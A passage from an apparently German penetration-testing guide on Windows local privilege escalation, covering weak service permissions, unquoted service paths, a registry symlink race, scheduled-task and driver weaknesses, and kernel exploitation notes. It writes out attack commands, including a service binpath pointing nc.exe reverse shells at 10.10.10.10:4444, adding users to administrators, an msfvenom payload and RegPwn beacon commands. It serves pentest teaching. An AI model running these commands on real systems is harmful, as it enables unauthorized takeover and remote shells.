Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Es wird empfohlen zu prüfen, ob „Authenticated Users“ einen Dienst ändern können:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Sie können accesschk.exe für XP hier herunterladen](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn dieser Fehler auftritt (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, weil er deaktiviert ist oder ihm keine aktivierten Geräte zugeordnet sind._

Sie können ihn aktivieren mit

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Beachten Sie, dass der Dienst upnphost unter XP SP1 von SSDPSRV abhängt.**

**Eine weitere Möglichkeit,** dieses Problem zu umgehen, besteht darin, Folgendes auszuführen:

```
sc.exe config usosvc start= auto
```

### **Dienst-Binärpfad ändern**

Wenn die Gruppe „Authentifizierte Benutzer“ über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, kann die ausführbare Binärdatei des Dienstes geändert werden. So ändern und starten Sie **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Dienst neu starten

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Berechtigungen können über verschiedene Rechte ausgeweitet werden:

- **SERVICE_CHANGE_CONFIG**: Ermöglicht die Neukonfiguration der Dienst-Binärdatei.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen und damit das Ändern von Dienstkonfigurationen.
- **WRITE_OWNER**: Ermöglicht die Übernahme des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Beinhaltet ebenfalls die Möglichkeit, Dienstkonfigurationen zu ändern.
- **GENERIC_ALL**: Beinhaltet ebenfalls die Möglichkeit, Dienstkonfigurationen zu ändern.

Zur Erkennung und Ausnutzung dieser Schwachstelle kann _exploit/windows/local/service_permissions_ verwendet werden.

### Schwache Berechtigungen für Dienst-Binärdateien

Wenn ein Dienst als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder unter einem privilegierten Domänenkonto ausgeführt wird, aber **Benutzer mit geringen Berechtigungen die Dienst-EXE oder deren übergeordneten Ordner ändern können**, lässt sich der Dienst häufig hijacken, indem **die Binärdatei ersetzt und der Dienst neu gestartet wird**.

**Prüfe, ob du die von einem Dienst ausgeführte Binärdatei ändern kannst** oder ob du **Schreibberechtigungen für den Ordner hast**, in dem sich die Binärdatei befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Mit **wmic** (nicht in system32) kannst du alle von einem Dienst ausgeführten Binärdateien ermitteln und deine Berechtigungen mit **icacls** prüfen:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Du kannst auch **sc** und **icacls** verwenden:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Achte auf gefährliche ACLs für **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`**, insbesondere auf **`(F)`**, **`(M)`** oder **`(W)`** für die ausführbare Dienstdatei oder das Verzeichnis, in dem sie liegt. Ein praktischer Ablauf zum Ausnutzen ist:<sup>[[27]](#references)</sup>

1. Ermittle das Dienstkonto und den Pfad zur ausführbaren Datei mit `sc qc <service_name>`.
2. Prüfe mit `icacls <path>`, ob die Binärdatei beschreibbar ist.
3. Ersetze die Dienst-Binärdatei durch ein Payload oder eine gültige schädliche Dienst-Binärdatei.
4. Starte den Dienst mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Neustart / Dienstauslöser).

Nützliche automatisierte Prüfungen:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Wenn der Dienst einem normalen Benutzer keinen Neustart erlaubt, prüfen Sie, ob er beim Booten automatisch gestartet wird, eine Fehleraktion hat, die ihn erneut startet, oder indirekt durch die Anwendung ausgelöst werden kann, die ihn verwendet.

### Änderungsberechtigungen für Dienstregistrierungsschlüssel

Sie sollten prüfen, ob Sie Registrierungsschlüssel eines Dienstes ändern können.\
Sie können Ihre **Berechtigungen** für einen **Registrierungsschlüssel** eines Dienstes wie folgt **überprüfen**:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Der ursprüngliche Berechtigungstest lautete:

Es sollte geprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Ist dies der Fall, kann die vom Dienst ausgeführte Binärdatei geändert werden.

Prüfe, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** Schreibberechtigungen für einen bestimmten Dienstschlüssel in der Registry haben. Ein ACL-Eintrag allein belegt keinen effektiven Zugriff: Deny-Einträge, das aktuelle Token und geerbte Berechtigungen sind ebenfalls relevant. Die Berechtigungen für einen Registrierungsschlüssel sind von den Rechten `SERVICE_CHANGE_CONFIG` und `SERVICE_START` für das Dienstobjekt getrennt. Eine Rechteausweitung erfordert außerdem ein nutzbares Dienstkonfigurationsfeld, eine Möglichkeit, den Dienst auszulösen, und eine Dienstidentität mit höheren Berechtigungen. Siehe die Microsoft-Referenzen zu [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) und [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

So änderst du den Pfad der ausgeführten Binärdatei:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry-Symlink-Race für beliebigen HKLM-Werteschreibzugriff (ATConfig)

Einige Windows-Barrierefreiheitsfunktionen erstellen benutzerspezifische **ATConfig**-Schlüssel, die später von einem **SYSTEM**-Prozess in einen HKLM-Sitzungsschlüssel kopiert werden. Eine Registry-**Symlink-Race** kann diesen privilegierten Schreibzugriff auf einen beliebigen **HKLM-Pfad** umleiten und so einen beliebigen HKLM-**Werteschreibzugriff** ermöglichen.<sup>[[18]](#references)</sup>

Schlüsselpfade (Beispiel: Bildschirmtastatur `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Barrierefreiheitsfunktionen auf.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` speichert benutzergesteuerte Konfiguration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` wird bei der Anmeldung oder beim Wechsel zum Secure Desktop erstellt und kann vom Benutzer beschrieben werden.

Ablauf des Angriffs (CVE-2026-24291 / ATConfig):

1. Trage den **HKCU-ATConfig**-Wert ein, der von SYSTEM geschrieben werden soll.
2. Löse das Kopieren zum Secure Desktop aus (z. B. mit **LockWorkstation**), wodurch der AT-Broker-Ablauf gestartet wird.
3. **Gewinne die Race**, indem du ein **Oplock** auf `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` setzt. Sobald das Oplock ausgelöst wird, ersetze den **HKLM-Session-ATConfig**-Schlüssel durch einen **Registry-Link** auf ein geschütztes HKLM-Ziel.
4. SYSTEM schreibt den vom Angreifer gewählten Wert in den umgeleiteten HKLM-Pfad.

Sobald du beliebige HKLM-Werte schreiben kannst, kannst du durch Überschreiben von Dienstkonfigurationswerten zu LPE wechseln:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/Befehlszeile)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wähle einen Dienst aus, den ein normaler Benutzer starten kann (z. B. **`msiserver`**), und starte ihn nach dem Schreibzugriff. **Hinweis:** Die öffentliche Exploit-Implementierung **sperrt die Workstation** als Teil der Race.

Beispiel-Tooling (RegPwn BOF / Standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### AppendData/AddSubdirectory-Berechtigungen in der Dienstregistrierung

Wenn Sie diese Berechtigung für eine Registrierung haben, bedeutet das, dass **Sie unter dieser Registrierung Unterschlüssel erstellen können**. Bei Windows-Diensten reicht das aus, um **beliebigen Code auszuführen**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Wenn der Pfad zu einer ausführbaren Datei nicht in Anführungszeichen steht, versucht Windows, jeden Abschnitt bis zu einem Leerzeichen auszuführen.

Für den Pfad _C:\Program Files\Some Folder\Service.exe_ versucht Windows beispielsweise, Folgendes auszuführen:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Liste alle nicht in Anführungszeichen gesetzten Dienstpfade auf, ausgenommen diejenigen, die zu integrierten Windows-Diensten gehören:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Sie können** diese Schwachstelle mit Metasploit erkennen und ausnutzen: `exploit/windows/local/trusted\_service\_path` Sie können manuell mit Metasploit eine Service-Binärdatei erstellen:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Wiederherstellungsaktionen

Windows ermöglicht es Benutzern, Aktionen festzulegen, die ausgeführt werden, wenn ein Dienst ausfällt. Diese Funktion kann so konfiguriert werden, dass sie auf eine Binärdatei verweist. Wenn diese Binärdatei ersetzt werden kann, ist möglicherweise eine Rechteausweitung möglich. Weitere Details finden Sie in der [offiziellen Dokumentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ziele von Skripten geplanter Aufgaben

Prüfen Sie bei einer aktivierten Aufgabe, die `cmd.exe /c` mit einer `.bat`- oder `.cmd`-Datei ausführt, sowohl das in den **Aktionsargumenten** genannte Skript als auch `cmd.exe`. Dasselbe gilt für ein explizites Dateiargument eines Interpreters, etwa PowerShell `-File`. Wenn eine geplante Batchdatei einen direkten PowerShell-Aufruf mit `-File` enthält, prüfen Sie auch die ACL des angegebenen Skripts; Variablen, Bedingungen und Shell-Verkettungen müssen manuell nachvollzogen werden. Ein für den aufrufenden Benutzer beschreibbares Skript oder übergeordnetes Verzeichnis ist nur dann ein Ansatzpunkt für eine kontoübergreifende Ausführung, wenn sich der konfigurierte Aufgabenkontext vom aufrufenden Benutzer unterscheidet und die Aufgabe diese Aktion tatsächlich erreicht. Eine ACL, die nur das Anhängen erlaubt, kann bei Skripten relevant sein; ein früheres `exit` oder ein anderer Kontrollfluss kann angehängte Zeilen jedoch unerreichbar machen. Prüfen Sie die effektiven ACLs, den [Ausführungskontext der Aufgabe](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), das Arbeitsverzeichnis, den Trigger und die Richtlinie zur Anwendungskontrolle, bevor Sie eine Rechteausweitung behaupten. Die Bestandsaufnahme darf das Skript weder ändern noch die Aufgabe starten.

## Benannte Streams in zugänglichen Dateien

Unter NTFS kann eine lesbare Datei einen benannten `:$DATA`-Stream enthalten, dessen Inhalt in einer gewöhnlichen Verzeichnisauflistung nicht angezeigt wird. Prüfen Sie bei einer kleinen, relevanten Auswahl zugänglicher Sicherungs- oder Konfigurationsdateien zunächst die **Namen und Größen** der Streams, bevor Sie Inhalte öffnen. Windows stellt diese über [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) und PowerShell über [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) bereit. Ein Streamname, der auf ein Geheimnis hindeutet, ist lediglich ein Ansatzpunkt. Prüfen Sie den effektiven Lesezugriff auf die Datei, die Stream-Unterstützung des Dateisystems, ob der Stream verwendbare Zugangsdaten enthält und für welches Konto diese tatsächlich gelten. Vermeiden Sie rekursive Stream-Scans und die Ausgabe von Stream-Inhalten bei der routinemäßigen Bestandsaufnahme.

## Eingaben des Windows Driver Kit-Hilfsprogramms für geplante Aufgaben

Das optionale Windows Driver Kit enthält `StandaloneRunner.exe`, das in seinem Ausführungsverzeichnis die Dateien `command.txt`, `reboot.rsf` und eine Projektdatei `working\rsf.rsf` verarbeiten kann. Eine geplante Aufgabe oder ein Dienst, der dieses Hilfsprogramm mit einem privilegierten Konto startet, kann Schreibzugriff mit niedrigen Rechten auf diese Eingaben in Befehlsausführung im Kontext dieses Kontos verwandeln, selbst wenn die ausführbare Datei des Hilfsprogramms geschützt ist. Stellen Sie fest, welches privilegierte Konto die Dateien verarbeitet und ob **beide** Begleitdateien erstellt oder geändert werden können; das Hilfsprogramm allein zu finden, reicht nicht aus.

Prüfen Sie bei einer geplanten Aufgabe deren [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) und die ACLs der beiden Begleitdateipfade. Wenn die Aufgabe kein Arbeitsverzeichnis angibt, ist das Verzeichnis der ausführbaren Datei lediglich ein Ansatzpunkt, den Sie überprüfen müssen, und kein Beleg dafür, wo die Aufgabe ihre Eingaben einliest. Auch die Voraussetzung der Projektarbeitsdatei muss erfüllt sein. Prüfen Sie den tatsächlichen Aufgabenkontext, statt anzunehmen, dass die Aufgabe als SYSTEM ausgeführt wird.

## Anwendungen

### Installierte Anwendungen

Prüfen Sie die **Berechtigungen der Binärdateien** (vielleicht können Sie eine davon überschreiben und Ihre Rechte ausweiten) sowie der **Ordner** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Reparaturpfad des Checkmk-Windows-Agenten

[CVE-2024-0670](https://checkmk.com/werk/16361) betrifft ältere Checkmk-Windows-Agenten, die Befehlsdateien in `C:\Windows\Temp` geschrieben und bei einem fehlgeschlagenen Ersetzen anschließend eine bereits vorhandene, schreibgeschützte Datei ausgeführt haben. Der Hersteller hat das Problem in 2.1.0p40, 2.2.0p23, 2.3.0b1 und 2.4.0b1 behoben. Prüfen Sie den vollständigen installierten Patchstand und ob der betroffene Agent-Vorgang ausgeführt werden kann; eine Angabe nur des Hauptzweigs wie `2.1` reicht nicht aus, um eine Betroffenheit festzustellen. Bei der Enumeration können Version, Dienststatus und Temp-Berechtigungen geprüft werden, ohne Dateien zu erstellen oder Agent-Befehle auszulösen.

#### Überprüfung des ADSelfService-Plus-SAML-Dienstes

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) betraf ADSelfService Plus bis einschließlich Build 6210; der Hersteller hat das Problem in Build 6211 behoben. Die Schwachstelle ist nur relevant, wenn SAML SSO **aktiviert ist oder war**. Ein Eintrag für das installierte Produkt oder ein Dienstpfad ist daher ein Anhaltspunkt, aber kein Schwachstellennachweis: Prüfen Sie den genauen Build, den Verlauf der SAML-Konfiguration, die Netzwerkerreichbarkeit des Dienstes und das Konto, unter dem er ausgeführt wird. Die Codeausführung über den Dienst übernimmt die Berechtigungen dieses Kontos; eine Ausführung als SYSTEM setzt eine Instanz voraus, die als SYSTEM läuft. Eine lesbare `OfflineBackup_*.ezip` im Backup-Verzeichnis des Produkts ist ein separater Hinweis auf ein verschlüsseltes Backup und kein Nachweis für verwendbare Anmeldedaten oder diese SAML-Schwachstelle. Notieren Sie bei der routinemäßigen Enumeration den Pfad und die Zugriffsrechte, ohne die Datei zu entpacken.

#### Grenzen zwischen Jenkins-Controller und Domänenkonto

Unterscheiden Sie auf einem Windows-Jenkins-Controller zwischen der Berechtigung, einen Job zu erstellen oder zu konfigurieren, und der Berechtigung, ihn zu starten: [Jenkins dokumentiert diese als separate Rechte `Job/Create`, `Job/Configure` und `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Ein konfigurierter Zeitplan oder ein Remote-Trigger kann einen weiteren Weg zum Starten eines Builds bieten; prüfen Sie jedoch, ob er aktiviert ist und der Build tatsächlich ausgeführt wird. Die Ausführung erfolgt unter der Identität des Controllers oder des ausgewählten Agents, und auf gespeicherte Anmeldedaten kann nur zugegriffen werden, wenn der Job Zugriff auf deren Geltungsbereich hat. Prüfen Sie außerdem den Zugriff auf Metadaten in `JENKINS_HOME`: Jenkins speichert Anmeldedaten und Verschlüsselungsschlüssel in `credentials.xml`, `secrets/hudson.util.Secret` und `secrets/master.key` ([Jenkins-Speicherung von Geheimnissen](https://www.jenkins.io/doc/developer/security/secrets/)). Ihr bloßes Vorhandensein gibt kein Passwort preis; prüfen Sie den **Lesezugriff auf die erforderlichen Dateien** und einen davon getrennten Pfad zur Wiederverwendung des Kontos, ohne Geheimnisse in gemeinsam genutzten Ausgaben auszugeben. Wenn dieses Konto über ein Schreibrecht für `scriptPath` am AD-Benutzerobjekt verfügt, bestätigen Sie vor der Einstufung als kontoübergreifende Ausführung, dass der Skriptpfad beschreibbar ist und ein tatsächlicher Anmelde- oder geplanter Vorgang als Zielbenutzer ausgeführt wird. Weitere Gruppensteuerungsmöglichkeiten erfordern eine gesonderte Überprüfung der effektiven AD-Rechte.

#### Identität eines selbst gehosteten Azure-Pipelines-Agents

Unterscheiden Sie bei einem Azure DevOps Server- oder Azure-Pipelines-Projekt zwischen der Berechtigung, eine Pipeline zu **erstellen oder zu bearbeiten**, und der Berechtigung, sie in die Warteschlange zu stellen und den ausgewählten Agent-Pool zu verwenden; [Microsoft dokumentiert Pipeline-Berechtigungen](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) und [die Autorisierung von Pools](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) getrennt. Wenn ein Konto mit geringeren Berechtigungen einen Skriptschritt einreichen und die Pipeline auf einem selbst gehosteten Windows-Agent ausführen kann, wird der Schritt unter dem [konfigurierten Betriebssystemkonto des Agents](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) ausgeführt. Prüfen Sie die genaue Pipeline, Einschränkungen für Branches und Ressourcen, den autorisierten Pool, den ausführbaren Job und die Dienstidentität des Agents, bevor Sie einen Übergang zu einem anderen Benutzerkonto oder zu SYSTEM behaupten. Ein installierter Agent, eine Projektrolle oder alleiniger Schreibzugriff auf ein Repository ist nur ein Anhaltspunkt; prüfen Sie Berechtigungen und lokale Dienstmetadaten, ohne während einer passiven Enumeration einen Build zu starten.

#### Microsoft Entra Connect Sync-Anmeldedaten

[Microsoft unterscheidet](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) zwischen dem **ADSync-Dienstkonto**, unter dem der Synchronisierungsdienst ausgeführt wird und das auf seine SQL-Datenbank zugreift, und dem **AD DS-Connector-Konto**, dessen Verzeichnisberechtigungen von den konfigurierten Synchronisierungsfunktionen abhängen. Connector-Anmeldedaten werden verschlüsselt in dieser Datenbank gespeichert; das Schlüsselmaterial wird [durch DPAPI unter dem ADSync-Dienstkonto geschützt](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Ein installierter Synchronisierungsdienst, eine Gruppe, deren Name auf lokale Administratorrechte hindeutet, oder alleiniger Datenbankzugriff belegt weder entschlüsselbare Anmeldedaten noch eine Rechteausweitung in der Domäne. Prüfen Sie getrennt die tatsächlichen Leserechte auf die Datenbank, den Zugriff auf das Dienstkonto und den Schlüssel, die Installations- und SQL-Struktur, die konfigurierte Connector-Identität sowie deren effektive AD-Berechtigungen. Bei der routinemäßigen Enumeration sollten nur Dienst- und Zugriffsmetadaten angezeigt werden, nicht die gespeicherten Geheimnisse abgefragt oder ausgegeben werden.

#### Berechtigungen für Support-DLLs von Druckertreibern

Ein installierter Druckertreiber kann Support-DLLs unter `C:\ProgramData` speichern und sie in einem privilegierteren Druckprozess laden. Prüfen Sie die ACLs des genauen Treiberverzeichnisses und der DLLs, einschließlich übergeordneter Verzeichnisse und Reparse Points, auch wenn die WMI-Enumeration von Druckern verweigert wird. Für das [Problem mit Ricoh-Druckertreibern CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) wurde als Pfad `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` angegeben; [die ursprüngliche Offenlegung](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) beschreibt das Laden von DLLs durch `PrintIsolationHost.exe`. Eine beschreibbare ACL ist nur ein Anhaltspunkt: Prüfen Sie den effektiven Schreibzugriff nach Berücksichtigung verweigernder Einträge, ob der betreffende Treiber installiert ist und die Datei unter einer privilegierten Identität lädt sowie ob eine aktualisierte Treiberversion oder ein Sicherheitsprogramm des Herstellers die Installation behoben hat. Leiten Sie eine Schwachstelle nicht allein aus dem Verzeichnisnamen oder der Treiberversion ab.

### Schreibberechtigungen

Prüfen Sie, ob Sie eine Konfigurationsdatei ändern können, um eine spezielle Datei zu lesen, oder ob Sie eine Binärdatei ändern können, die unter einem Administratorkonto ausgeführt wird (schedtasks).

Eine Möglichkeit, schwache Berechtigungen für Ordner und Dateien im System zu finden, ist folgende:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++-Plugin-Autoload-Persistenz/Ausführung

Notepad++ lädt automatisch alle Plugin-DLLs in seinen Unterordnern `plugins`. Wenn eine beschreibbare portable Installation/Kopie vorhanden ist, führt das Ablegen eines schädlichen Plugins bei jedem Start automatisch Code in `notepad++.exe` aus (einschließlich `DllMain` und Plugin-Callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Beim Start ausführen

**Prüfe, ob du einen Registry-Eintrag oder eine Binärdatei überschreiben kannst, die von einem anderen Benutzer ausgeführt wird.**\
**Lies** die **folgende Seite**, um mehr über interessante **Autoruns-Speicherorte zur Rechteausweitung** zu erfahren:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Treiber

Suche nach möglichen **seltsamen/verwundbaren Treibern von Drittanbietern**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Wenn ein Treiber eine primitive Funktion für beliebige Kernel-Lese-/Schreibzugriffe bereitstellt (häufig bei schlecht entworfenen IOCTL-Handlern), kannst du deine Rechte erhöhen, indem du direkt aus dem Kernel-Speicher ein SYSTEM-Token stiehlst.<sup>[[13]](#references)</sup> Die schrittweise Anleitung findest du hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Verwandtes Material zur Windows-Kernel-Exploitation:

Ein Fall mit einem Ring-Buffer im Kernelmodus und benutzerbeschreibbaren Lese-/Schreibregistern wird in der [USB-MIDI-Variante mit wiederholtem Streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming) beschrieben.

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Bei Race-Condition-Bugs, bei denen der anfällige Aufruf einen vom Angreifer kontrollierten Object-Manager-Pfad öffnet, lässt sich das Lookup gezielt verlangsamen (etwa mit Komponenten maximaler Länge oder tief verschachtelten Verzeichnisketten), um das Zeitfenster von Mikrosekunden auf mehrere zehn Mikrosekunden zu verlängern:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAFs in cancel-sicheren Queues, Offenlegung von paged-pool-Speicher und I/O-Ring-Pivots

Manche Windows-Kernel-LPE-Ketten lassen sich aus zwei für sich genommen schwachen Bugs zusammensetzen: einer **Race Condition bei der Lebensdauer einer cancel-sicheren Queue**, bei der eine Anfrage/CBD freigegeben wird, während die Queue-Sperre noch gehalten wird, und einer Offenlegung durch **Freigabe der Sperre vor dem Kopieren**, bei der während `RtlCopyToUser` eine freigegebene paged-pool-Allokation offengelegt wird.<sup>[[29]](#references)</sup>

Hinweise zur Analyse und Exploitation:

- **Freigabe unter Sperre + anschließender Abbruch**: Suche nach einem Erfolgs-Pfad mit **Acquire -> CompleteRequest/free -> Release**, während der Abbruch-Pfad **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** ausführt. Erreicht der Erfolgs-Pfad `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`, bevor die CBDQ/CSQ-Sperre freigegeben wird, kann ein Thread, der in `NtCancelIoFileEx -> IopCsqCancelRoutine` blockiert ist, später fortfahren und einen freigegebenen `PFLT_CALLBACK_DATA` an den Remove-Callback des Treibers übergeben.
- **Das freigegebene Queue-Objekt zurückerlangen** mit einer gleich großen, vom Angreifer kontrollierten paged-pool-Allokation. `NPFS`-Data-Queue-Einträge sind nützlich, weil sich Payload und Größe kontrollieren lassen und sie später mit Pipe-Lese-/Peek-Operationen untersucht werden können. Enthält das freigegebene Objekt List-Links, überschreibe sie mit einer **zyklischen Liste gefälschter Anfrageknoten im Userspace**, damit der Treiber wiederholt vom Angreifer definierte Anfragestrukturen verarbeitet, statt am ursprünglichen Listenkopf anzuhalten.
- **Einen vorhersagbaren Schreibzugriff ausbauen**: Wenn die gefälschte Anfrage einen verschachtelten Kontextzeiger umleitet, der für Buchhaltungsschreibzugriffe verwendet wird (Zeitstempel / QPC / refcount-nahe Felder), erhältst du möglicherweise einen **adresskontrollierten, aber nicht wertkontrollierten** Kernel-Schreibzugriff. Ziele in diesem Fall auf das **Längen-/Größenfeld** eines gesprayten Pool-Objekts statt auf einen abschließenden Code-/Datenzeiger und durchsuche anschließend den Spray, bis das beschädigte Objekt einen **Out-of-Bounds-Lesezugriff auf den paged pool** ermöglicht.
